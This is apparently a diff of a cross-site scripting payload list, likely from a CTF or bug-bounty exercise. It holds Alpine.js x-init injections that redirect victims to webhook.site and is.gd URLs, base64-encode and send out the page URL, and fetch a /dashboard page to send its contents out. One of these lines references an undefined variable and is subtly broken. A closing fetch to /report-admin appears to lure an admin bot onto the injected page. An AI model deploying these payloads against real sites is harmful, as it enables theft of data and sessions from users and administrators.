@@ -1,3 +1,4 @@
+```html
 <script src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js"></script><div x-data x-init="alert(1)"></div>
 <script src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js"></script><div x-data x-init="location='https://webhook.site/f85f0c8f-d978-4be0-b61b-cb0cf60e6435/?msg=it_works'"></div>
 <script src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js"></script><div x-data x-init="location='//is.gd/eor0OI?msg=it_works'"></div>
@@ -9,3 +10,11 @@
 <script src="https://cdn.jsdelivr.net/npm/alpinejs@3/dist/cdn.min.js"></script><div x-data x-init="fetch('/dashboard').then(r=>location='//is.gd/YfsknT?s='+btoa(t.slice(0,800)))"></div>
 
 <script src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.3/dist/cdn.min.js"></script><div x-data x-init="location='https://webhook.site/f85f0c8f-d978-4be0-b61b-cb0cf60e6435/?u='+btoa(location.href)"></div>
+```
+```javascript
+fetch('/report-admin', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  body: 'source_page=part2'
+});
+```
